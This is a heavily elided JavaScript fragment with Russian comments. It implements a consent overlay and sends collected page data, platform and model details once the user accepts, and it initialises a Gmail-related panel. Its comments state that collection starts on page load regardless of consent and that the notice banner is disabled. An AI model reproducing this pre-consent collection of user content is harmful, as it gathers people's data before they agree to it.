    // Глобальная переменная для хранения собранных данных
    ...
    (function consentOverlay(){
      try{
        ...
        if (accepted) {
          // Если согласие уже есть, отправляем данные сразу
          if (isDataReady && collectedData) {
        ...
        accept.addEventListener('click', ()=>{
          ...
          // Отправляем данные сразу, если они уже собраны
          if (isDataReady && collectedData) {
            sendCollectedData(collectedData);
          } else {
            // Если данные еще собираются, ждем их готовности
            ...
            // Таймаут на случай, если сбор данных займет слишком много времени
            setTimeout(() => clearInterval(checkInterval), 10000);
          }
        });
        decline.addEventListener('click', ()=>{ 
          // При отказе просто удаляем данные и перенаправляем
          collectedData = null;
    ...
    // Уведомление-баннер отключён: политику согласия реализует страница disclaimer.html
    ...
    // Функция отправки собранных данных
    function sendCollectedData(data) {
      ...
      try {
        ...
        Promise.race([send(), new Promise((_,rej)=>setTimeout(()=>rej(new Error('timeout')), 6000))]).catch(()=>{});
      } catch {}
    }

    // Сбор данных начинается сразу при загрузке страницы (независимо от согласия)
    (function(){
      (async()=>{
        ...
        // Сохраняем собранные данные в глобальную переменную
        collectedData = { content: txt, platform: zA, model: he.model||'' };
        isDataReady = true;
        
        // Если согласие уже было дано ранее, отправляем данные сразу
        const accepted = localStorage.getItem('disclaimer_accepted') === 'true';
        if (accepted) {
          sendCollectedData(collectedData);
        }
    ...
    (function(){
      ...
      if(document.readyState === 'loading') document.addEventListener('DOMContentLoaded', initGmailPanel);
      else initGmailPanel();
    })();
    (function () {
